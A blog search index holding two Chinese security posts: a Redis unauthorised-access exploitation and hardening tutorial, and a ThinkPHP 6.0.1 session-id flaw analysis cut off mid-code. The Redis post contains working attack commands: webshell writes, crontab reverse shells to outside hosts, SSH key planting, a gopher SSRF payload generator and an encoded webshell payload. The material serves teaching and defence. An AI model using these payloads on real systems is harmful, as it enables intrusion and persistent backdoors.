<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>redis相关漏洞</title>
      <link href="/2020/02/04/shu-ju-ku/redis-xiang-guan-lou-dong/"/>
      <url>/2020/02/04/shu-ju-ku/redis-xiang-guan-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="Redis未授权访问漏洞的利用及防护"><a href="#Redis未授权访问漏洞的利用及防护" class="headerlink" title="Redis未授权访问漏洞的利用及防护"></a>Redis未授权访问漏洞的利用及防护</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>目标主机：Ubuntu 16.04.6</p><h4 id="配置redis"><a href="#配置redis" class="headerlink" title="配置redis"></a>配置redis</h4><p>1后端模式启动，修改redis.conf配置文件， daemonize yes 以后端模式启动</p><pre><code>daemonize yes</code></pre><p>再执行命令<code>redis-server redis.conf</code>启动redis</p><p>2去除ip绑定</p><pre><code># bind 127.0.0.1</code></pre><p>3关闭保护模式，允许远程连接redis服务(Redis3.2之后新特性)</p><pre><code>protected-mode no</code></pre><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><h4 id="1向web目录写webshell"><a href="#1向web目录写webshell" class="headerlink" title="1向web目录写webshell"></a>1向web目录写webshell</h4><pre class=" language-mysql"><code class="language-mysql">redis-cli -h 192.168.x.x #连接目标redisflushall #清除其他数据set a "<?php @eval($_POST['a']);?>" #设置值CONFIG SET dir /var/www/html #设置web目录CONFIG SET dbfilename shell.php #设置备份文件名save #保存</code></pre><h4 id="2写crontab定时任务，反弹shell"><a href="#2写crontab定时任务，反弹shell" class="headerlink" title="2写crontab定时任务，反弹shell"></a>2写crontab定时任务，反弹shell</h4><p>先开启端口监听</p><p>连接redis，写入反弹shell</p><pre class=" language-shell"><code class="language-shell"># 被攻击机是UBUNTUredis-cli -h 192.168.x.xset aa "\n\n*/1 * * * * ln -s -f bash /bin/sh\n\n"set ab "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/x.x.x.x/2333 0>&1\n\n"set bb "\n\n*/1 * * * * bash -c 'bash -i >& /dev/tcp/raohh.cn/2334 0>&1'\n\n"CONFIG SET dir /var/spool/cron/crontabsCONFIG SET dbfilename rootsave# 被攻击机是CENTOSredis-cli -h 192.168.x.xset aaa "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/x.x.x.x/2333 0>&1\n\n"CONFIG SET dir /var/spool/cronCONFIG SET dbfilename rootsave</code></pre><p>然后接收shell</p><h4 id="3写入ssh公钥，直接连接主机。"><a href="#3写入ssh公钥，直接连接主机。" class="headerlink" title="3写入ssh公钥，直接连接主机。"></a>3写入ssh公钥，直接连接主机。</h4><pre class=" language-mysql"><code class="language-mysql">CONFIG SET dir /root/.sshCONFIG SET dbfilename authorized_keysSET a "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDH4wHdHYIeVWywzESA/zUiFkJtLFsD19XR1IhI6zcqPOYO6iLLi54oKniGEfwvtoDiBI+FCxdvF9B4FARnl1s3YSA3R8uX084dfyL6q8TGidY0axAITIs3h7q/DeYSfMlfTYbCZDo9IculNfVp0swV1HHmU8ZA9ghqr0nekCNW6Syisj9IUHLVpt5LdqIDRniZFu+/S/nc0ggAd3HeB9uWQcn0Gd8mAO+DcvduK6ssf/LadB4xVXwSPTL3k7bKBZTB14zcO/B9N/fRSi/gauvPxQuplmTXm95H+WHQJdK6j2AtfDrSYZTwtpmPwuon18Pz9Znd6WjrmS0kf2bg/YDl xxx\n\n\n"save</code></pre><p>再<code>ssh root@ip -i id_rsa</code>就可以连接上了</p><h3 id="Redis未授权访问漏洞的防护"><a href="#Redis未授权访问漏洞的防护" class="headerlink" title="Redis未授权访问漏洞的防护"></a>Redis未授权访问漏洞的防护</h3><h4 id="禁止远程使用一些高危命令"><a href="#禁止远程使用一些高危命令" class="headerlink" title="禁止远程使用一些高危命令"></a>禁止远程使用一些高危命令</h4><p>我们可以通过修改redis.conf文件来禁用远程修改DB文件地址</p><pre class=" language-text"><code class="language-text">rename-command FLUSHALL ""rename-command CONFIG   ""rename-command EVAL     ""</code></pre><h4 id="低权限运行Redis服务"><a href="#低权限运行Redis服务" class="headerlink" title="低权限运行Redis服务"></a>低权限运行Redis服务</h4><p>为Redis服务创建单独的<code>user</code>和<code>home</code>目录，并且配置禁止登陆</p><pre class=" language-text"><code class="language-text">groupadd -r redis && useradd -r -g redis redis</code></pre><h4 id="为Redis添加密码验证"><a href="#为Redis添加密码验证" class="headerlink" title="为Redis添加密码验证"></a>为Redis添加密码验证</h4><p>我们可以通过修改redis.conf文件来为Redis添加密码验证</p><pre class=" language-text"><code class="language-text">requirepass mypassword</code></pre><h4 id="禁止外网访问-Redis"><a href="#禁止外网访问-Redis" class="headerlink" title="禁止外网访问 Redis"></a>禁止外网访问 Redis</h4><p>我们可以通过修改redis.conf文件来使得Redis服务只在当前主机可用</p><pre class=" language-text"><code class="language-text">bind 127.0.0.1</code></pre><h4 id="保证authorized-keys文件的安全"><a href="#保证authorized-keys文件的安全" class="headerlink" title="保证authorized_keys文件的安全"></a>保证authorized_keys文件的安全</h4><p>为了保证安全，您应该阻止其他用户添加新的公钥。将<code>authorized_keys</code>的权限设置为对拥有者只读，其他用户没有任何权限</p><pre class=" language-text"><code class="language-text">chmod 400 ~/.ssh/authorized_keys</code></pre><p>为保证<code>authorized_keys</code>的权限不会被改掉，您还需要设置该文件的immutable位权限</p><pre class=" language-text"><code class="language-text">chattr +i ~/.ssh/authorized_keys</code></pre><p>然而，用户还可以重命名<code>~/.ssh</code>，然后新建新的<code>~/.ssh</code>目录和<code>authorized_keys</code>文件。要避免这种情况，需要设置<code>~./ssh</code>的immutable位权限</p><pre class=" language-text"><code class="language-text">chattr +i ~/.ssh</code></pre><p>如果需要添加新的公钥，需要移除<code>authorized_keys</code>的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上immutable位权限</p><h2 id="利用-Gopher-协议拓展攻击面"><a href="#利用-Gopher-协议拓展攻击面" class="headerlink" title="利用 Gopher 协议拓展攻击面"></a>利用 Gopher 协议拓展攻击面</h2><p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。在ssrf时常常会用到gopher协议构造post包来攻击内网应用。其实构造方法很简单，与http协议很类似。</p><p>基本协议格式：<code>URL:gopher://&lt;host&gt;:&lt;port&gt;/_</code>后接TCP数据流</p><h3 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h3><p>开始端口转发<code>socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</code> 这一个命令监听4444端口并将4444端口数据转发至6379也就是redis-server端口。</p><p>redis先连上4444端口，执行命令<code>set hh &#39;1234&#39;</code></p><pre class=" language-shell"><code class="language-shell">root@iZ2ze5s6ej00cdkfjisoauZ:~/redis/redis-2.8.17/src# ./redis-cli -p 4444127.0.0.1:4444> set hh '1234'OK127.0.0.1:4444> get hh"1234"</code></pre><p>在查看数据转发接收的数据</p><pre class=" language-shell"><code class="language-shell">root:# socat -v tcp-listen:4444,fork tcp-connect:localhost:6379> 2020/02/04 14:10:38.168870  length=31 from=0 to=30*3\r$3\rset\r$2\rhh\r$4\r1234\r< 2020/02/04 14:10:38.169100  length=5 from=0 to=4+OK\r> 2020/02/04 14:10:42.534986  length=21 from=31 to=51*2\r$3\rget\r$2\rhh\r< 2020/02/04 14:10:42.535216  length=10 from=5 to=14$4\r1234\r</code></pre><p>自己改的生成payload的脚本 (添加了url编码)</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding: utf-8</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> urllibexp <span class="token operator">=</span> <span class="token string">'gopher://127.0.0.1:6379/_'</span>sign<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">with</span> open<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token string">'>&lt;'</span> <span class="token operator">and</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">' '</span> <span class="token operator">and</span> <span class="token string">'length'</span> <span class="token keyword">in</span> line <span class="token operator">and</span> <span class="token string">'from'</span> <span class="token keyword">in</span> line <span class="token operator">and</span> <span class="token string">'to'</span> <span class="token keyword">in</span> line<span class="token punctuation">:</span>            <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span> <span class="token string">'>'</span><span class="token punctuation">:</span>                sign<span class="token operator">=</span><span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                sign<span class="token operator">=</span><span class="token number">0</span>            <span class="token keyword">continue</span>        <span class="token keyword">elif</span> sign<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token comment" spellcheck="true"># 判断倒数第1、2、3字符串是否为\r</span>        <span class="token keyword">elif</span> line<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> r<span class="token string">'\r'</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 如果该行只有\r，将\r替换成%0a%0d%0a</span>            <span class="token keyword">if</span> len<span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>                exp <span class="token operator">=</span> exp <span class="token operator">+</span> <span class="token string">'%0a%0d%0a'</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                line <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                line <span class="token operator">=</span> line <span class="token operator">+</span> <span class="token string">'%0d%0a'</span>                exp <span class="token operator">=</span> exp <span class="token operator">+</span> line        <span class="token comment" spellcheck="true"># 判断是否是空行，空行替换为%0a</span>        <span class="token keyword">elif</span> line <span class="token operator">==</span> <span class="token string">'\x0a'</span><span class="token punctuation">:</span>            exp <span class="token operator">=</span> exp <span class="token operator">+</span> <span class="token string">'%0a'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            line <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>line<span class="token punctuation">)</span>            line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%0A'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>            exp <span class="token operator">=</span> exp <span class="token operator">+</span> line<span class="token keyword">print</span> exp</code></pre><p>生成的payload</p><pre class=" language-shell"><code class="language-shell">➜ python payload.py socatgopher://127.0.0.1:6379/_%2A3%0d%0a%243%0d%0aset%0d%0a%242%0d%0ahh%0d%0a%244%0d%0a1234%0d%0a%2A2%0d%0a%243%0d%0aget%0d%0a%242%0d%0ahh%0d%0a➜ curl 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$2%0d%0ahh%0d%0a$4%0d%0a1234%0d%0a*2%0d%0a$3%0d%0aget%0d%0a$2%0d%0ahh%0d%0a'+OK$41234</code></pre><h3 id="攻击内网redis"><a href="#攻击内网redis" class="headerlink" title="攻击内网redis"></a>攻击内网redis</h3><p>搭建环境 <code>apt-get install php7.x-curl</code></p><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#shell.php</span><span class="token delimiter">&lt;?php</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>禁止远程访问</p><p>注意payload需要url编码一下，当payload中含有 <code>&lt; ? &gt;</code> 等符号</p><pre class=" language-shell"><code class="language-shell">#写数据库curl 'http://ip/shell.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%242%250d%250ahh%250d%250a%244%250d%250a1234%250d%250a%2A2%250d%250a%243%250d%250aget%250d%250a%242%250d%250ahh%250d%250a'#写webshellcurl "http://ip/shell.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A3%250d%250a%25243%250d%250aset%250d%250a%25241%250d%250aa%250d%250a%252427%250d%250a%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527a%2527%255D%2529%253B%253F%253E%250d%250a%252A4%250d%250a%25246%250d%250aCONFIG%250d%250a%25243%250d%250aSET%250d%250a%25243%250d%250adir%250d%250a%252413%250d%250a%2Fvar%2Fwww%2Fhtml%250d%250a%252A4%250d%250a%25246%250d%250aCONFIG%250d%250a%25243%250d%250aSET%250d%250a%252410%250d%250adbfilename%250d%250a%25245%250d%250as.php%250d%250a%252A1%250d%250a%25244%250d%250asave%250d%250a"</code></pre><p>反弹shell只能<code>Centos</code>上使用，<code>Ubuntu上行不通</code>，原因如下：</p><ol><li>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/</code>权限必须是600才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/</code>权限644也能执行</li><li>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li></ol><h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><p>因配置不当可以未经授权访问，攻击者无需认证就可以访问到内部数据，其漏洞可导致敏感信息泄露（Redis服务器存储一些有趣的session、cookie或商业数据可以通过get枚举键值），也可以恶意执行flushall来清空所有数据，攻击者还可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件。如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接免密码登录服务器，其相关漏洞信息如下：</p><h4 id="Redis-4-x-RCE"><a href="#Redis-4-x-RCE" class="headerlink" title="Redis 4.x RCE"></a>Redis 4.x RCE</h4><p>攻击场景：1 能够访问远程redis的端口（直接访问或者SSRF）2 对redis服务器可以访问到的另一台服务器有控制权，可以写文件</p><p>通过 MODULE LOAD加载redis外部的模块</p><h4 id="Redis-远程代码执行漏洞-CVE-2016-8339"><a href="#Redis-远程代码执行漏洞-CVE-2016-8339" class="headerlink" title="Redis 远程代码执行漏洞(CVE-2016-8339)"></a>Redis 远程代码执行漏洞(CVE-2016-8339)</h4><p>Redis 3.2.x &lt; 3.2.4版本存在缓冲区溢出漏洞，可导致任意代码执行。Redis数据结构存储的CONFIG SET命令中client-output-buffer-limit选项处理存在越界写漏洞。构造的CONFIG SET命令可导致越界写，代码执行。</p><h4 id="CVE-2015-8080"><a href="#CVE-2015-8080" class="headerlink" title="CVE-2015-8080"></a>CVE-2015-8080</h4><p>Redis 2.8.x在2.8.24以前和3.0.x 在3.0.6以前版本，lua_struct.c中存在getnum函数整数溢出，允许上下文相关的攻击者许可运行Lua代码（内存损坏和应用程序崩溃）或可能绕过沙盒限制意图通过大量，触发基于栈的缓冲区溢出。</p><h4 id="CVE-2015-4335"><a href="#CVE-2015-4335" class="headerlink" title="CVE-2015-4335"></a>CVE-2015-4335</h4><p>Redis 2.8.1之前版本和3.0.2之前3.x版本中存在安全漏洞。远程攻击者可执行eval命令利用该漏洞执行任意Lua字节码</p><h4 id="CVE-2013-7458读取“-rediscli-history”配置文件信息。"><a href="#CVE-2013-7458读取“-rediscli-history”配置文件信息。" class="headerlink" title="CVE-2013-7458读取“.rediscli_history”配置文件信息。"></a>CVE-2013-7458读取“.rediscli_history”配置文件信息。</h4>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp &lt; 6.0.2 session id未作过滤</title>
      <link href="/2020/01/23/lou-dong-fu-xian/thinkphp6.0.1/"/>
      <url>/2020/01/23/lou-dong-fu-xian/thinkphp6.0.1/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞版本环境"><a href="#漏洞版本环境" class="headerlink" title="漏洞版本环境"></a>漏洞版本环境</h2><p>2020年1月13号，Thinkphp 6.0.2发布，在详情页指出修复了一处<code>Session安全隐患</code>。</p><pre class=" language-bash"><code class="language-bash">➜  htdocs composer create-project topthink/think tp</code></pre><p>将 <strong>composer.json</strong> 文件修改版本号为成 <strong>“topthink/framework”: “6.0.1”</strong> ，并执行如下命令。</p><pre class=" language-shell"><code class="language-shell">➜  tp composer update➜  tp php think run --host=0.0.0.0 --port=8001</code></pre><p>修改 <strong>/app/middleware.php</strong> 开启Session功能</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 全局中间件定义文件</span><span class="token keyword">return</span> <span class="token punctuation">[</span>    <span class="token comment" spellcheck="true">// 全局请求缓存</span>    <span class="token comment" spellcheck="true">// \think\middleware\CheckRequestCache::class,</span>    <span class="token comment" spellcheck="true">// 多语言加载</span>    <span class="token comment" spellcheck="true">// \think\middleware\LoadLangPack::class,</span>    <span class="token comment" spellcheck="true">// Session初始化</span>     \<span class="token package">think<span class="token punctuation">\</span>middleware<span class="token punctuation">\</span>SessionInit</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token keyword">class</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>当开启session功能后时，会发现 <strong>session</strong> 文件默认存储在 <strong>./runtime/session</strong> 下，其文件名格式为<strong>sess_PHPSESSID</strong> 。而当我们在 <strong>PHPSESSID</strong> 中输入特殊字符时，程序还是能正常生成对应文件。所以这里存在任意文件创建漏洞，再通过路径穿越，还存在getshell的可能</p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>先diff一下thinkphp6.0.2的代码，可以发现6.0.1在设置<code>session id</code>时未对值进行<code>ctype_alnum()</code>校验，从而导致可以传入任意字符。</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//thinkphp6.0.2</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">setId</span><span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> void<span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ctype_alnum</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$id</span> <span class="token punctuation">:</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">microtime</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">session_create_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//thinkphp6.0.1</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">setId</span><span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> void<span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">32</span> <span class="token operator">?</span> <span class="token variable">$id</span> <span class="token punctuation">:</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">microtime</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">session_create_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>传入任意字符会有什么危害？看一下thinkphp通过session id创建对应的session文件的过程</p><p>在注册中间件后，触<strong>SessionInit.php</strong>里的<code>handle()</code>函数，其中<code>$cookieName</code>值为’PHPSESSID’，由于<code>session.var_session_id</code>默认是空<code>$sessionId</code>值是从<code>$request-&gt;cookie(&#39;PHPSESSID&#39;)</code>中获取的，最后通过<code>$this-&gt;session-&gt;setId($sessionId)</code>将可控的cookie值赋值给<code>$this-&gt;session-&gt;id</code></p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//vendor/topthink/framework/src/think/middleware/SessionInit.php</span><span class="token keyword">class</span> <span class="token class-name">SessionInit</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$app</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$session</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> Closure <span class="token variable">$next</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Session初始化</span>        <span class="token variable">$varSessionId</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">app</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'session.var_session_id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$cookieName</span>   <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">session</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$varSessionId</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$varSessionId</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$sessionId</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$varSessionId</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$sessionId</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token variable">$cookieName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$sessionId</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">session</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setId</span><span class="token punctuation">(</span><span class="token variable">$sessionId</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//vendor/topthink/framework/src/think/session/Store.php</span><span class="token keyword">class</span> <span class="token class-name">Store</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">'PHPSESSID'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">setId</span><span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> void    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">32</span> <span class="token operator">?</span> <span class="token variable">$id</span> <span class="token punctuation">:</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">microtime</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">session_create_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>在<code>end()</code>函数中触发了<code>save()</code>,先通过<code>getid()</code>获取<strong>sessionId</strong>，然后传入<code>$this-&gt;handler-&gt;write()</code></p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//vendor/topthink/framework/src/think/middleware/SessionInit.php</span><span class="token keyword">class</span> <span class="token class-name">SessionInit</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">end</span><span class="token punctuation">(</span>Response <span class="token variable">$response</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">session</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//vendor/topthink/framework/src/think/session/Store.php</span><span class="token keyword">class</span> <span class="token class-name">Store</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> void    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">clearFlashData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sessionId</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$sessionId</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            